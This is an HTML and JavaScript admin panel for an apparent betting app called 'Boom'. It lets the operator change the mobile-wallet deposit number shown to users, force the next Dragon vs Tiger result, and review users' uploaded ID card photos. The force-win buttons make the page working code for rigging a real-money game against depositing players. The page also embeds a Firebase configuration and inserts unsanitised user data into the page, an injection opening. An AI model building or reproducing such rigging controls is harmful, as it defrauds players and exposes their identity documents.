<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Boom Admin Master - 3D Control</title>
    <style>
        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; padding: 20px; margin: 0; }
        .card { 
            background: #111; 
            border: 1px solid #ffcc00; 
            border-radius: 20px; 
            padding: 20px; 
            margin-bottom: 25px; 
            box-shadow: 0 10px 20px rgba(0,0,0,0.5);
        }
        h2 { color: #ffcc00; text-align: center; text-transform: uppercase; letter-spacing: 2px; }
        
        /* --- LUXURY 3D BUTTONS --- */
        .btn-3d {
            position: relative;
            display: inline-block;
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            font-size: 18px;
            font-weight: bold;
            text-align: center;
            border: none;
            border-radius: 12px;
            cursor: pointer;
            transition: all 0.1s ease;
            text-transform: uppercase;
            color: #fff;
        }
        /* Push Effect */
        .btn-3d:active {
            transform: translateY(4px);
            box-shadow: 0 2px 0 rgba(0,0,0,0.5) !important;
        }

        .btn-update { background: linear-gradient(#ffcc00, #d4aa00); color: #000; box-shadow: 0 6px 0 #997a00; }
        .btn-dragon { background: linear-gradient(#007bff, #0056b3); box-shadow: 0 6px 0 #003d80; }
        .btn-tiger { background: linear-gradient(#ff4444, #cc0000); box-shadow: 0 6px 0 #8b0000; }
        .btn-random { background: linear-gradient(#444, #222); box-shadow: 0 6px 0 #000; }

        input { 
            width: 90%; padding: 15px; border-radius: 10px; border: 1px solid #333; 
            background: #222; color: #fff; font-size: 16px; margin-bottom: 10px;
        }
        .kyc-box { background: #1a1a1a; padding: 15px; border-radius: 12px; margin-top: 15px; border-left: 5px solid #ffcc00; }
        .img-grid { display: flex; gap: 10px; margin: 10px 0; }
        .img-grid img { width: 48%; border-radius: 8px; border: 1px solid #444; cursor: pointer; }
        #status { color: #00ff00; font-family: monospace; text-align: center; margin-bottom: 10px; }
    </style>
</head>
<body>

    <h2>🚀 BOOM ADMIN MASTER</h2>
    <div id="status">System Online</div>

    <div class="card">
        <h3>💰 UPDATE DEPOSIT DETAILS</h3>
        <input type="text" id="dep-num" placeholder="EasyPaisa/JazzCash Number">
        <button class="btn-3d btn-update" onclick="updateDep()">UPDATE USER APP 📲</button>
    </div>

    <div class="card">
        <h3>🎮 GAME RESULT CONTROL</h3>
        <button class="btn-3d btn-dragon" onclick="setForce('dragon')">FORCE DRAGON WIN 🐉</button>
        <button class="btn-3d btn-tiger" onclick="setForce('tiger')">FORCE TIGER WIN 🐯</button>
        <button class="btn-3d btn-random" onclick="setForce('random')">RANDOM MODE 🎲</button>
        <p style="font-size: 12px; color: #888; text-align: center;">Next result will be forced to your choice.</p>
    </div>

    <div class="card">
        <h3>📥 PENDING KYC APPROVALS</h3>
        <div id="kyc-list">Loading Requests...</div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, remove, update } from "https://www.gstatic.com/firebasejs/12.11.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyALm0SnUYjeeh4kJj9QBk4BgaINwnooa3c",
            authDomain: "boom-earnings.firebaseapp.com",
            databaseURL: "https://boom-earnings-default-rtdb.firebaseio.com",
            projectId: "boom-earnings",
            appId: "1:787871998344:web:3c20aa47e7e51001d01a3d"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // --- Update Deposit Number ---
        window.updateDep = () => {
            const num = document.getElementById('dep-num').value;
            if(!num) return alert("Number likhein!");
            set(ref(db, 'admin/deposit_number'), num)
            .then(() => alert("User App Updated!"));
        };

        // --- Force Win Logic ---
        window.setForce = (side) => {
            set(ref(db, 'game_settings/next_winner'), side)
            .then(() => alert("Result Forced: " + side.toUpperCase()));
        };

        // --- KYC Viewer Logic (Front & Back) ---
        onValue(ref(db, 'kyc_submissions'), (snap) => {
            const list = document.getElementById('kyc-list');
            const data = snap.val();
            if (!data) { list.innerHTML = "No pending requests."; return; }

            let html = "";
            for (let id in data) {
                html += `
                    <div class="kyc-box">
                        <p><strong>User:</strong> ${id}</p>
                        <div class="img-grid">
                            <img src="${data[id].front_id_url}" onclick="window.open(this.src)" title="Front Side">
                            <img src="${data[id].back_id_url}" onclick="window.open(this.src)" title="Back Side">
                        </div>
                        <button class="btn-3d btn-update" onclick="approve('${id}')">APPROVE ✅</button>
                    </div>
                `;
            }
            list.innerHTML = html;
        });

        window.approve = (id) => {
            update(ref(db, 'users/' + id), { kyc_status: 'verified' })
            .then(() => {
                remove(ref(db, 'kyc_submissions/' + id));
                alert("User Verified!");
            });
        };
    </script>
</body>
</html>
